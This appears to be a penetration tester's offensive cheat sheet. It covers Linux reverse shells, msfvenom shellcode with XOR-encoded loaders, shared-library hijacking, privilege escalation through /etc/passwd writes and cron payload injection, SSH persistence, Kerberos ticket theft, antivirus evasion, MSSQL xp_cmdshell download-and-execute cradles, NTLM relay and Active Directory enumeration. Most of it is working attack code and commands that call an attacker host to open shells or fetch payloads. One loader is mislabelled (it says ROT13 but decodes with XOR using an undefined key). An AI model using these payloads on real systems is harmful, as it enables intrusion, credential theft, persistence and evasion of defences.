sh -i >& /dev/tcp/[ip]/[port] 0>&1

curl http://[ip]/s.sh | bash

# netcat with -e
nc [ip] [port] -e /bin/sh
nc -nv [ip] [port] -e /bin/bash

# netcat without -e
mkfifo /tmp/f; nc [ip] [port] < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f

echo 'nc [ip] [port] -e /bin/bash' >> [file]

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[ip]",[port]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

echo 'import socket,subprocess,os;s=socket.socket();s.connect(("[ip]",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > shell.py

6.1.3 Payloads

6.1.4 XOR Payload Encoder

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// To compile:
// gcc simpleXORencoder.c -o simpleXORencoder

// msfvenom -p linux/x64/shell_reverse_tcp LHOST=[ip] LPORT=[port] -f c
unsigned char buf[] =
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x00\x50\xc0\xa8\x31\x43\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

int main (int argc, char **argv)
{
        int key = 250;
        int buf_len = (int) sizeof(buf);

        printf("XOR payload (key 0xfa):\n");

        for(int i=0; i<buf_len; i++)
        {
                printf("\\x%02X",buf[i]^key);
        }

        return 0;
}

6.1.5 Simple Loader

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// To compile:
// gcc -o simpleLoader simpleLoader.c -z execstack

// XOR-encoded 'linux/x64/shell_reverse_tcp' payload (key: 0xfa)
unsigned char buf[] = "\x90\xD3\xA2\x63\x90\xF8\xA5\x90\xFB\xA4\xF5\xFF\xB2\x6D\xB2\x43\xF8\xFA\xFA\xAA\x3A\x52\xCB\xB9\xAB\xB2\x73\x1C\x90\xEA\xA0\x90\xD0\xA2\xF5\xFF\x90\xF9\xA4\xB2\x05\x34\x90\xDB\xA2\xF5\xFF\x8F\x0C\x90\xC1\xA2\x63\xB2\x41\xD5\x98\x93\x94\xD5\x89\x92\xFA\xA9\xB2\x73\x1D\xA8\xAD\xB2\x73\x1C\xF5\xFF\xFA";

int main (int argc, char **argv)
{
        int key = 250;
        int buf_len = (int) sizeof(buf);

        // Decode the payload
        for (int i=0; i<buf_len; i++)
        {
                buf[i] = buf[i] ^ key;
        }

        // Cast the shellcode to a function pointer and execute
        int (*ret)() = (int(*)())buf;
        ret();
}

6.1.6 Shared Library LD PRELOAD

#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

// To compile:
// gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_PRELOAD.o sharedLibrary_LD_PRELOAD.c
// gcc -shared -o sharedLibrary_LD_PRELOAD.so sharedLibrary_LD_PRELOAD.o -ldl

// msfvenom -p linux/x64/shell_reverse_tcp LHOST=[ip] LPORT=[port] -f c
unsigned char buf[] =
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x00\x50\xc0\xa8\x31\x43\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

uid_t geteuid(void)
{
        // Get the address of the original 'geteuid' function
        typeof(geteuid) *old_geteuid;
        old_geteuid = dlsym(RTLD_NEXT, "geteuid");

        // Fork a new thread based on the current one
        if (fork() == 0)
        {
                // Execute shellcode in the new thread
                intptr_t pagesize = sysconf(_SC_PAGESIZE);

                // Make memory executable (required in libs)
                if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC)) {
                        perror("mprotect");
                        return -1;
                }

                // Cast and execute
                int (*ret)() = (int(*)())buf;
                ret();
        }
        else
        {
                // Original thread, call the original function
                printf("[Hijacked] Returning from function...\n");
                return (*old_geteuid)();
        }
        printf("[Hijacked] Returning from main...\n");
        return -2;
}

6.1.7 Shared Library LD LIBRARY Path

#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

// Compile as follows:
// gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_LIBRARY_PATH.o sharedLibrary_LD_LIBRARY_PATH.c
// gcc -shared -o sharedLibrary_LD_LIBRARY_PATH.so sharedLibrary_LD_LIBRARY_PATH.o -ldl

static void runmahpayload() __attribute__((constructor));

int gpgrt_onclose;
int gpgrt_poll;

// ROT13-encoded 'linux/x64/shell_reverse_tcp' payload
char buf[] = "\x77\x36\x65\xa6\x77\x0f\x6c\x77\x0e\x6b\x1c\x12\x55\xa4\x55\xc6\x0f\x0d\x0d\x5d\xcd\xb5\x3e\x50\x5e\x55\x96\xf3\x77\x1d\x67\x77\x37\x65\x1c\x12\x77\x10\x6b\x55\x0c\xdb\x77\x2e\x65\x1c\x12\x82\x03\x77\x48\x65\xa6\x55\xc8\x3c\x6f\x76\x7b\x3c\x80\x75\x0d\x60\x55\x96\xf4\x5f\x64\x55\x96\xf3\x1c\x12";

void runmahpayload() {
        setuid(0);
        setgid(0);
        printf("Library hijacked!\n");
        int buf_len = (int) sizeof(buf);
        for (int i=0; i<buf_len; i++)
        {
                buf[i] = buf[i] ^ key;
        }
        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC);
        int (*ret)() = (int(*)())buf;
        ret();
}

6.2 Privilege Escalation

6.2.1 Enumeration

Check Command
Current user id
Hostname hostname
OS version / architecture cat /etc/issue, cat /etc/os-release, uname -a
Running processes ps aux
Network interfaces / open ports ip a, ss -anp
Firewall rules cat /etc/iptables/rules.v4
Scheduled cron tasks ls -lah /etc/cron*, crontab -l, sudo crontab -l
Installed packages dpkg -l
Writable directories find / -writable -type d 2>/dev/null
In-memory passwords strings /dev/mem -n10 | grep -i PASS
Sensitive files locate password | more
Mounted drives cat /etc/fstab, mount, lsblk
Kernel modules lsmod, /sbin/modinfo <driver_name>
SUID binaries / sudo rights find / -perm -u=s -type f 2>/dev/null, sudo -l
Automated enumeration unix-privesc-check

6.2.2 Abusing SUIDs

sudo -l

# Switch to root (NOPASSWD)
sudo su -

# Switch to another user
su - [user]
sudo su - [user]
sudo su - [user] -c "[command]"

All exploitable SUID binaries are catalogued at GTFOBins.

grep [process_name] /var/log/syslog

6.2.3 Important Files

Check dot-files for SSH private keys and hardcoded credentials.

  • .bashrc
  • .bash_profile
  • .mysql_history
  • .ssh
  • .enc
  • Any other relevant file

6.2.4 Password Files

6.2.5 /etc/passwd

If the file is writable, inject a new root-level user.

openssl passwd Password123

echo "newroot:[hash]:0:0:root:/root:/bin/bash" >> /etc/passwd

su newroot
id

6.2.6 /etc/shadow

If readable, extract and crack user hashes.

cat /etc/shadow | grep [user] > [user]_hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt [user]_hash.txt

# hashcat mode 1800 = sha512crypt
hashcat -m 1800 [user]_hash.txt /usr/share/wordlists/rockyou.txt

john --show [user]_hash.txt
hashcat -m 1800 [user]_hash.txt /usr/share/wordlists/rockyou.txt --show

6.2.7 Cracking Both Files

sudo unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

6.2.8 Setuid Binaries and Capabilities

6.2.9 Setuid Binaries

Setuid binaries run with the file owner's privileges (often root). Check GTFOBins for exploitation techniques.

find / -perm -4000 -type f 2>/dev/null
ls -l $(find / -perm -4000 -type f 2>/dev/null)

6.2.10 Exploiting Setuid Binaries

ps u -C [binary_name]
cat /proc/[PID]/status | grep Uid

find [directory] -exec [path_to_shell] \;
find / -name [vulnerable_binary] -exec /bin/bash -p \;

6.2.11 Cronjobs

Find cron jobs running as root but writable by the current user; inject a payload into the script.

grep "CRON" /var/log/syslog
cat /var/log/cron.log

ls -lah /path/to/script.sh

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip] [port] >/tmp/f" >> /path/to/script.sh

crontab -l
ls -alh /var/spool/cron
ls -al /etc/cron*
cat /etc/crontab
cat /etc/anacrontab
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /var/spool/cron/crontabs/root

6.3 Lateral Movement

6.3.1 Configuration Files

Dot-files often contain SSH keys, credentials, or clues about system layout.

  • .bashrc
  • .bash_profile
  • .mysql_history
  • .ssh
  • Any other relevant file

6.3.2 SSH

6.3.3 SSH Keys

find /home/ -name "id_rsa"

cat id_rsa
cat known_hosts

ssh2john [key_file] > [key_file]_hash.txt
sudo john --wordlist=/usr/share/wordlists/rockyou.txt [key_file]_hash.txt

ssh -i ./[key_file] [user]@[ip]

6.3.4 SSH Persistence

# On attacker machine
ssh-keygen

# Append attacker's public key to victim's authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8= kali@kali" >> /home/[user]/.ssh/authorized_keys

ssh [user]@[ip]

6.3.5 SSH Hijacking with ControlMaster

ControlMaster multiplexes SSH connections over one socket. If write access to a user's home directory exists, you can hijack their active sessions to pivot without credentials.

# Check for existing ControlMaster config / sockets
cat ~/.ssh/config
cat /etc/ssh/ssh_config
ls /home/[user]/.ssh/controlmaster/

# Reuse an existing socket
ssh -S /home/[user]/.ssh/controlmaster/[user]\@[host]\:22 [user]@[host]

# If running as root, hijack another user's socket
ssh -S /home/[user]/.ssh/controlmaster\@[user]@[host]\:22 [user]@[host]

6.3.6 SSH Agent Forwarding

Agent forwarding proxies signing requests from an intermediate host back to the origin client. An adversary on the intermediate machine can abuse the forwarded agent socket to authenticate to downstream hosts.

ssh [user]@[host]

# Identify forwarded agent socket
SSH_AUTH_SOCK=/tmp/ssh-[random] ssh-add -l

# Use it to connect onward
SSH_AUTH_SOCK=/tmp/ssh-[random] ssh [user]@[host]

6.3.7 Ansible

cat /etc/ansible/hosts
ls /etc/ansible/

# Convert vault to crackable hash
ansible2john root.enc > vault.hash
john --wordlist=rockyou.txt vault.hash

# Decrypt vault with recovered password
cat the_vault | ansible-vault decrypt

# Crack YAML-embedded vault strings (hashcat mode 16900)
ansible2john web.yaml > ansible_web_hash.txt
hashcat --wordlist=/usr/share/wordlists/rockyou.txt --force --hash-type=16900 ansible_web_hash.txt

cat pw.txt | ansible-vault decrypt

Check /opt/playbooks/ and /var/log/syslog for plaintext credentials embedded in playbook commands (e.g. /opt/playbooks/mysql.yml).

6.3.8 Artifactory (JFrog)

Binary repository manager, typically on port 8082. Credential leaks occur in database backups and Derby database tables.

ps aux | grep artifactory

# Inspect access backup for bcrypt hashes
ls /opt/jfrog/artifactory/var/backup/access/
cat /opt/jfrog/artifactory/var/backup/access/access.backup.*.json

# Crack bcrypt hash (mode 3200)
echo '$2a$08$[hash]' > hash.txt
sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Copy and unlock the Derby database
mkdir /tmp/hackeddb
sudo cp -r /opt/jfrog/artifactory/var/data/access/derby /tmp/hackeddb
sudo chmod 755 /tmp/hackeddb/derby
sudo rm /tmp/hackeddb/derby/*.lck

# Connect with Derby ij utility and dump users
sudo /opt/jfrog/artifactory/app/third-party/java/bin/java -jar /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij

connect 'jdbc:derby:/tmp/hackeddb/derby';
select * from access_users;

6.3.9 Kerberos

6.3.10 Stealing Keytab Files

Keytab files store encrypted keys for a Kerberos principal, enabling passwordless authentication. They are commonly used in cron jobs for automated service access.

ktutil

ktutil:  addent -password -p [user]@[DOMAIN] -k 1 -e rc4-hmac
ktutil:  wkt /tmp/[user].keytab
ktutil:  quit

kinit [user]@[DOMAIN] -k -t /tmp/[user].keytab
klist

# Renew an expired TGT
kinit -R

smbclient -k -U "[DOMAIN]\[user]" //[dc].[DOMAIN]/C$

6.3.11 Stealing and Using Cached Files

Two scenarios: (1) control an active shell — use the existing tickets directly; (2) privileged access — copy /tmp/krb5cc* and import to impersonate the user without their password.

ls -al /tmp/krb5cc_*

sudo cp /tmp/krb5cc_[original] /tmp/krb5cc_minenow
sudo chown [user]:[user] /tmp/krb5cc_minenow

kdestroy
export KRB5CCNAME=/tmp/krb5cc_minenow
klist

# Request service tickets with stolen TGT
kvno MSSQLSvc/[dc].[domain]:1433
klist

6.3.12 Using Impacket Suite with Kerberos

scp [user]@[host]:/tmp/krb5cc_minenow /tmp/krb5cc_minenow
export KRB5CCNAME=/tmp/krb5cc_minenow

sudo apt install krb5-user

Add DC IP to /etc/hosts:

echo "[dc_ip]  [DOMAIN] [dc_hostname].[DOMAIN]" >> /etc/hosts

Comment out proxy_dns in /etc/proxychains.conf to avoid DNS leaks through the proxy.

# Optional: SOCKS tunnel for proxychains (add 'socks 127.0.0.1 9050' to proxychains.conf)
ssh [user]@[host] -D 9050

# List AD users
proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip [dc_ip] [DOMAIN]/Administrator

# Gather SPNs
proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip [dc_ip] [DOMAIN]/Administrator

# Shell via psexec
proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@[dc_hostname].[DOMAIN] -k -no-pass

6.4 Shared Library Hijacking

Linux equivalent of DLL hijacking: a dynamic loader searches an ordered set of paths for a shared object, so an attacker-controlled .so placed earlier in the chain (or forced via an environment variable) is loaded instead of the legitimate one. The payload runs through a library constructor (on load) or by hooking an exported function.

# Search location Abuse
1 Binary RPATH Hard-coded; writable if the directory is attacker-controlled
2 LD_LIBRARY_PATH env var Point a named library at a malicious copy
3 Binary RUNPATH Same as RPATH but checked after LD_LIBRARY_PATH
4 /etc/ld.so.conf Add a writable directory to the cache
5 System dirs (/lib, /usr/lib, ...) Drop a missing .so the program fails to find

Find a target a victim runs as sudo, then enumerate the libraries it loads. Pick one loaded but rarely called (e.g. an error-reporting library) so the program still runs after hijack.

# Libraries resolved by a dynamic binary
ldd /usr/bin/top

# Library calls made at runtime (pick a function called once, e.g. geteuid)
ltrace cp

Malicious shared object skeleton. The constructor attribute fires the payload the moment the library is loaded, regardless of what the original program intended. Add shellcode execution (mprotect + cast) or a function hook as needed.

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid

// gcc -Wall -fPIC -c -o hax.o hax.c
// gcc -shared -o libhax.so hax.o

static void runmahpayload() __attribute__((constructor));

void runmahpayload() {
        setuid(0);
        setgid(0);
        printf("Library hijacked\n");
        system("touch /tmp/haxso.txt");
}

LD_LIBRARY_PATH — override a named library. Rename the malicious object to the soname of the library being hijacked, then run the target.

export LD_LIBRARY_PATH=/home/[user]/ldlib/
cp libhax.so libgpg-error.so.0
top

Replacing a real library usually triggers missing symbol / version not defined errors before the constructor runs. Define dummy symbols of the right names, and (if the loader demands versioned symbols) build a version-script map. The loader only checks that the names exist, not their type or use.

# Generate C variable stubs for the missing symbols
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 \
  | grep FUNC | grep GPG_ERROR \
  | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'

# Same symbols wrapped into a version map (gpg.map):
#   GPG_ERROR_1.0 { gpgrt_onclose; ... gpgrt_poll; };
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 \
  | grep FUNC | grep GPG_ERROR \
  | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'

# Recompile with the version script
gcc -Wall -fPIC -c -o hax.o hax.c
gcc -shared -Wl,--version-script gpg.map -o libgpg-error.so.0 hax.o

LD_PRELOAD — preload a library so its functions override later ones (function hooking). Redefine an exported symbol, then call the original via dlsym(RTLD_NEXT, ...) so the program keeps working; fork() the payload so the call returns immediately. No constructor needed.

export LD_PRELOAD=/home/[user]/evil_geteuid.so
cp /etc/passwd /tmp/testpasswd

Triggering via SUID / sudo: a user environment is dropped under sudo (env_reset), and the loader ignores LD_LIBRARY_PATH / LD_PRELOAD entirely when real UID != effective UID. Set the variable explicitly inside a sudo alias in the victim's .bashrc; if the target sudo command has NOPASSWD it fires automatically.

# Force the variable into the sudo environment (add to ~/.bashrc)
alias sudo="sudo LD_LIBRARY_PATH=/home/[user]/ldlib"
alias sudo="sudo LD_PRELOAD=/home/[user]/evil_geteuid.so"
source ~/.bashrc

# Then any sudo run of the hijacked binary executes the payload as root
sudo top

6.5 Defense Evasion

Linux endpoint AV (e.g. Kaspersky Endpoint Security) is largely signature-based; raw msfvenom ELF payloads are caught, but wrapping shellcode in a custom loader or encoding it defeats most scanners. Scan offline with Antiscan.me rather than VirusTotal to avoid feeding samples back to vendors.

# Manual scan + detection name (Kaspersky)
sudo kesl-control --scan-file ./met.elf
sudo kesl-control -E --query | grep DetectName

# Raw 64-bit ELF is detected; the x64/zutto_dekiru encoder evades signature scan
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] \
  -e x64/zutto_dekiru -f elf -o met64.elf

# Emit shellcode as C to embed in a custom loader (defeats ELF signatures)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f c

Wrap the shellcode in a C loader and cast it to a function pointer. The stack is non-executable by default, so compile with -z execstack; this on-disk loader alone bypasses Kaspersky real-time scanning.

gcc -o hack.out hack.c -z execstack

To defeat the remaining signature scanners, XOR-encode the shellcode with a one-byte key, store the obfuscated bytes in the loader, and XOR them back in memory before execution so no plaintext payload ever touches disk (full encoder/decoder loader in 7.1.3.1 / 7.1.3.2).

// Decode in place, then execute from memory
char xor_key = 'J';
int arraysize = (int) sizeof(buf);
for (int i = 0; i < arraysize - 1; i++)
        buf[i] = buf[i] ^ xor_key;
int (*ret)() = (int(*)())buf;
ret();

7.3 Relay Attacks

7.3.1 Capture Hashes

sudo responder -I tun0

-- Trigger outbound auth from the SQL server
EXECUTE ('master.sys.xp_dirtree "\\[attacker_ip]\a"')

hashcat -m 5600 [hash].txt /usr/share/wordlists/rockyou.txt --force

7.3.2 Relay Auth to Other Server

# Relay to collect hashes table
proxychains -q impacket-ntlmrelayx --no-http-server -smb2support -t smb://[target_ip]

# Relay and execute a command / reverse shell
proxychains -q impacket-ntlmrelayx --no-http-server -smb2support -t [target_ip] -c "powershell -enc [base64_payload]"
proxychains -q impacket-ntlmrelayx --no-http-server -smb2support -t [target_ip] -e payload.exe

nc -nvlp [port]
python3 -m http.server 80

-- Trigger auth from already-owned SQL server toward attacker (causes relay)
EXECUTE ('master.sys.xp_dirtree "\\[attacker_ip]\c"')

7.4 Linked Server

7.4.1 Add New Users for Linked Server

impacket-mssqlclient [user]:[password]@[sql_server]

-- Create sysadmin login on linked server
EXEC ('EXEC sp_addlogin ''[user]'', ''[password]''') at [[linked_server]];
EXEC ('EXEC sp_addsrvrolemember ''[user]'', ''sysadmin''') at [[linked_server]];

impacket-mssqlclient [user]:"[password]"@[linked_server]

# enable xp_cmdshell after connecting
enable_xp_cmdshell

# Relay from linked server — trigger outbound NTLM
sudo responder -I tun0

xp_dirtree '\\[attacker_ip]\a';

# Reverse shell via encoded dropper
echo -en 'IEX ((new-object net.webclient).downloadstring("http://[attacker_ip]/run.ps1"))' | iconv -t UTF-16LE | base64 -w 0

EXEC ('xp_cmdshell ''powershell -w hidden -enc [base64_payload]'' ') AT [[linked_server]]

-- Drop nc64 and execute
xp_cmdshell "powershell.exe iwr -uri http://[attacker_ip]/nc64.exe -o c:\windows\tasks\nc64.exe"
xp_cmdshell "c:\windows\tasks\nc64.exe [attacker_ip] [port] -e cmd.exe"

7.5 Privilege Escalation

TechniquePreconditionTool
Login ImpersonationIMPERSONATE grant on target loginPowerUpSQL, SQLRecon
xp_cmdshellsysadmin or xp_cmdshell enabledPowerUpSQL, SQLRecon, mssqlclient
OLE Automationsysadmin, OLE enabledSQLRecon (/m:olecmd)
CLR Assemblysysadmin, CLR enabled, UNSAFE assemblySQLRecon (/m:clr)
SeImpersonatePrivilege (Potato)Service account has SeImpersonateDeadPotato via xp_cmdshell

7.5.1 Impersonation

# PowerUpSQL — audit and auto-exploit impersonation
Invoke-SQLAudit -Verbose -Instance [instance]
Invoke-SQLAuditPrivImpersonateLogin -Verbose -Instance [instance]
Invoke-SQLAuditPrivImpersonateLogin -Verbose -Instance [instance] -Exploit

# SQLRecon — enumerate and impersonate
.\SQLRecon.exe /a:WinToken /h:[host] /m:impersonate
.\SQLRecon.exe /a:WinToken /h:[host] /m:impersonate /i:sa /m:whoami
.\SQLRecon.exe /a:WinToken /h:[host] /m:impersonate /i:sa /m:enablexp
.\SQLRecon.exe /a:WinToken /h:[host] /m:impersonate /i:sa /m:xpcmd /c:"whoami /all"

7.5.2 Code Execution

# PowerUpSQL
Invoke-SQLOSCmd -Verbose -Command "whoami" -Instance [instance] -RawResults
Invoke-SQLOSCmdCLR -Verbose -Command "powershell.exe get-process" -Instance [instance] -RawResults
Invoke-SQLOSCmdOle -Verbose -Command "powershell.exe -c whoami" -Instance [instance] -RawResults

mssqlclient.py -dc-ip [dc_ip] [domain]/[user]:[password]@[target] -windows-auth

enable_xp_cmdshell
xp_cmdshell whoami /all
xp_cmdshell powershell.exe -c get-process

# SQLRecon — xp_cmdshell
.\SQLRecon.exe /a:WinToken /h:[host] /m:enablexp
.\SQLRecon.exe /a:WinToken /h:[host] /m:xpcmd /c:"whoami /all"

# SQLRecon — OLE (no console output; good for beacon drops)
.\SQLRecon.exe /a:WinToken /h:[host] /m:enableole
.\SQLRecon.exe /a:WinToken /h:[host] /m:olecmd /c:"powershell.exe -c iex (iwr -usebasicparsing http://[attacker_ip]/met.ps1)"

7.5.3 Code Execution through CLR

When using shellcode injection through CLR, prefer runners or process hollowing over direct injection. If injecting into a process, target one the impersonated account can access (e.g. sqlceip.exe under SA, not explorer.exe).

.NET Library template for CLR assembly: https://gist.github.com/skahwah/c92a8ce41f529f40c14715c91b8f90ce

# SQLRecon — enable CLR then load assembly
.\SQLRecon.exe /a:WinToken /h:[host] /impersonate /i:sa /m:enableclr
.\SQLRecon.exe /a:WinToken /h:[host] /m:impersonate /i:sa /m:clr /dll:"C:\temp\Warhead.dll" /function:Main
.\SQLRecon.exe /a:WinToken /h:[host] /m:impersonate /i:sa /m:clr /dll:"http://[attacker_ip]/Warhead.dll" /function:Main

7.5.4 MSSQL Service Account to SYSTEM

MSSQL service accounts often hold SeImpersonatePrivilege, enabling potato-based escalation to SYSTEM.

# DeadPotato via SQLRecon xpcmd — https://github.com/lypd0/DeadPotato
.\SQLRecon.exe /h:[sql_host] /a:wintoken /m:xpcmd /c:"powershell.exe -c iex (iwr -usebasicparsing http://[attacker_ip]/DeadPotato.exe -Outfile c:\windows\temp\o.exe); c:\windows\temp\o.exe -cmd whoami"

# Amnesiac reverse shell via DeadPotato — https://github.com/Leo4j/Amnesiac
.\SQLRecon.exe /h:[sql_host] /a:wintoken /m:xpcmd /c:"powershell.exe -c iex (iwr -usebasicparsing http://[attacker_ip]/DeadPotato.exe -Outfile c:\windows\temp\o.exe); c:\windows\temp\o.exe -cmd powershell.exe -NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc [base64_payload]"

7.5.5 MSSQLPwner

# Interactive mode — auto-discovers linked-server escalation chains
mssqlpwner -hashes ':[ntlm_hash]' '[domain]/[computer]$'@[ip] -windows-auth interactive

# Inside interactive session
get-chain-list
set-chain [chain_uuid]
exec "powershell.exe -c get-process"

7.6 Quick Reference

7.6.1 Instance Discovery

Get-SQLInstanceLocal
Get-SQLInstanceDomain
Get-SQLConnectionTest -Instance "[host],1433"
Get-SQLServerInfo -Instance "[instance]"

7.6.2 Privilege Enumeration

-- Sysadmin logins
select name from master..syslogins where sysadmin=1;

-- Logins that can be impersonated
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- xp_cmdshell status
select * from sys.configurations where name='xp_cmdshell';

7.6.3 Linked Servers

select * from master..sysservers;
exec sp_linkedservers;

Get-SQLServerLink -Instance <Instance> -Verbose
Get-SQLServerLinkCrawl -Instance <Instance> -Verbose
Get-SQLServerLinkCrawl -Instance <Instance> | Where-Object {$_.User -match 'sa'}

# Crawl with open query
Get-SQLQuery -Instance "[host]\[instance]" -Query "select * from openquery(""[linked_host]"",'select * from master..sysservers')"

7.6.4 Enable xp_cmdshell

EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
exec xp_cmdshell 'whoami';

# Via linked server (one hop)
Get-SQLQuery -Instance "[host]\[instance]" -Query "exec ('sp_configure ''show advanced options'', 1; reconfigure; exec sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [linked_server]; exec('xp_cmdshell ''hostname'';') at [linked_server]" -Username [user] -Password [password]

7.6.5 xp_cmdshell Reverse Shell

echo -en 'IEX ((new-object net.webclient).downloadstring("http://[attacker_ip]/runner64.txt"))' | iconv -t UTF-16LE | base64 -w 0

exec xp_cmdshell 'powershell -w hidden -enc [base64_payload]';

Invoke-SQLOSCmd -Instance "[host]\[instance]" -Command "powershell -w hidden -enc [base64_payload]" -RawResults

# Via linked server
Get-SQLQuery -Instance "[host]\[instance]" -Query "EXEC('xp_cmdshell ''powershell -w hidden -enc [base64_payload]'' ; ') AT [[linked_server]]"

7.6.6 Enable RPCout

execute as login='sa';
exec sp_serveroption '[linked_server]', 'rpc out', 'true';

Get-SQLQuery -Instance "[host]\[instance]" -Query "execute as login='sa'; exec sp_serveroption '[linked_server]', 'rpc out', 'true'"

8. Active Directory Enumeration

8.1 BloodHound & SharpHound

BloodHound visualises AD relationships and attack paths. SharpHound collects the raw data.

Version mismatch fix:

sudo -u postgres psql -d template1 -c "ALTER DATABASE template1 REFRESH COLLATION VERSION;"
sudo -u postgres psql -d postgres -c "ALTER DATABASE postgres REFRESH COLLATION VERSION;"
sudo bloodhound-setup

Load SharpHound directly into memory (AV evasion):

IEX (New-Object Net.WebClient).DownloadString('http://[ip]/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All

Download SharpHound to target:

Invoke-WebRequest -Uri "http://[ip]/SharpHound.ps1" -OutFile "C:\Temp\SharpHound.ps1"
Invoke-WebRequest -Uri "http://[ip]/SharpHound.exe" -OutFile "C:\Temp\SharpHound.exe"

Find domain name:

nltest /dclist:[domain]
Get-ADDomainController -Discover

Run SharpHound (exe):

.\SharpHound.exe -c All
.\SharpHound.exe -c All -d [domain] -u [user] -p [password] -f AllData
.\SharpHound.exe --CollectionMethod All,GPOLocalGroup,LoggedOn --domain [domain] --ldapusername [user] --ldappassword '[password]'

Run SharpHound (PowerShell module):

Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain [domain] -OutputDirectory C:\Temp
Invoke-BloodHound -CollectionMethod Group
Invoke-BloodHound -CollectionMethod ACL

Transfer the output zip to Kali:

# Evil-WinRM session
download [bloodhound_file].zip

# SCP
scp [user]@[ip]:'C:\Temp\*.zip' /tmp/

Start BloodHound on Kali (Neo4j web UI at https://localhost:7474, default creds neo4j:neo4j):

sudo neo4j start
bloodhound

Import the zip, then use the built-in queries or run manual Cypher queries.

Goal Cypher Query
All computers MATCH (m:Computer) RETURN m
All users MATCH (m:User) RETURN m
Active sessions MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
SQLAdmin users MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
CanPSRemote users MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
Shortest path to DA Built-in query: Find Shortest Paths to Domain Admins
Unconstrained delegation hosts Built-in query: Find Computers with Unconstrained Delegation
Kerberoastable accounts Built-in query: List all Kerberoastable Accounts

Cypher node format: (NODES)-[:RELATIONSHIP]->(NODES). Mark owned nodes to reveal escalation paths. Check WriteGPO/OwnsGPO edges for GPO abuse via SharpGPOAbuse.

8.2 LDAP

8.2.1 Nmap Scripting Scan

nmap -n -sV --script "ldap* and not brute" [ip]

8.2.2 ldapsearch

# Anonymous base query
ldapsearch -x -h [ip] -s base

# Get naming contexts
ldapsearch -x -H ldap://[ip] -s base namingcontexts

# Search entire base (unauthenticated)
ldapsearch -x -H ldap://[ip] -b "DC=[domain],DC=[tld]"

# All objects
ldapsearch -v -x -b "DC=[domain],DC=[tld]" -H "ldap://[ip]" "(objectclass=*)"

# Extract sAMAccountName values
ldapsearch -v -x -b "DC=[domain],DC=[tld]" -H "ldap://[ip]" "(objectclass=*)" | grep sAMAccountName:

# Authenticated — enumerate users
ldapsearch -x -h [ip] -D "[user]@[domain]" -w '[password]' -b "DC=[domain],DC=[tld]" "(objectClass=user)" sAMAccountName

